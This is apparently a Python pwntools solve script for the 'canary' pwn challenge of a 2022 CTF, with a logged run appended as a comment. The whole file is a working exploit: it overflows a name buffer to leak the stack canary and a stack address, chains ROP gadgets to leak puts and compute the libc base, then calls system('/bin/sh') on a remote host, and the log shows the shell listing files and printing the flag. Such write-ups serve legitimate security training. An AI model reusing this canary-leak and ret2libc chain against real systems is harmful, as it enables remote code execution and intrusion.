from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './canary'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "35.202.65.196"
  PORT = 1337
  s = remote(HOST, PORT)
  libc = ELF("./libc.so.6")
else:
  s = process(BINARY)
  libc = elf.libc

pop_rdi_ret = 0x401373 # pop rdi; ret; 
puts_plt    = 0x4010a0

s.recvuntil("Enter your name: ")
s.sendline("A"*72)

s.recvuntil("A\n")
canary = u64("\x00"+s.recv(7))
print "canary      =", hex(canary)
stack_leak = u64(s.recvuntil("\n")[:-1]+"\x00\x00")
print "stack_leak  =", hex(stack_leak )

s.send("n")
s.recvuntil("Enter your name again: ")

buf  = p64(pop_rdi_ret)
buf += p64(elf.got.puts)
buf += p64(puts_plt)
buf += p64(elf.sym._start)
buf += "A"*(0x48 - len(buf))
buf += p64(canary)
buf += p64(stack_leak - 0x78)
s.send(buf)

s.recvuntil("\n")
puts_addr = u64(s.recvuntil("\n")[:-1]+"\x00\x00")
libc_base   = puts_addr - libc.sym.puts
system_addr = libc_base + libc.sym.system
binsh_addr  = libc_base + next(libc.search('/bin/sh'))

print "puts_addr   =", hex(puts_addr)
print "libc_base   =", hex(libc_base)
print "system_addr =", hex(system_addr)
print "binsh_addr  =", hex(binsh_addr)

s.recvuntil("Enter your name: ")
s.sendline("A"*72)

s.recvuntil("A\n")
s.recv(7)
stack_leak = u64(s.recvuntil("\n")[:-1]+"\x00\x00")
print "stack_leak  =", hex(stack_leak )

s.send("n")
s.recvuntil("Enter your name again: ")

buf  = p64(pop_rdi_ret)
buf += p64(binsh_addr)
buf += p64(system_addr)
buf += "A"*(0x48 - len(buf))
buf += p64(canary)
buf += p64(stack_leak - 0x78)
s.send(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/Access_Denied_CTF_2022/Pwn_canary/canary$ python solve.py r
[*] '/home/mito/CTF/Access_Denied_CTF_2022/Pwn_canary/canary/canary'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 35.202.65.196 on port 1337: Done
[*] '/home/mito/CTF/Access_Denied_CTF_2022/Pwn_canary/canary/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
canary      = 0x38669b868b8e3500
stack_leak  = 0x7ffda83a96f0
puts_addr   = 0x7fa13e33b970
libc_base   = 0x7fa13e2bb000
system_addr = 0x7fa13e30a420
binsh_addr  = 0x7fa13e46ed88
stack_leak  = 0x7ffda83a95c0
[*] Switching to interactive mode
Thank you
$ id
/bin/sh: 1: id: not found
$ ls -l
total 44
drwxr-x--- 1 0 1000  4096 Jun 11 07:12 bin
-rwxr-x--- 1 0 1000 17064 Jun 11 07:08 canary
drwxr-x--- 1 0 1000  4096 Jun 11 07:12 dev
-rwxr----- 1 0 1000    37 Jun 11 07:12 flag.txt
drwxr-x--- 1 0 1000  4096 Jun 11 07:12 lib
drwxr-x--- 1 0 1000  4096 Jun 11 07:12 lib32
drwxr-x--- 1 0 1000  4096 Jun 11 07:12 lib64
$ cat flag.txt
accessdenied{1_l0v3_c00k13s_89bde7a}
'''
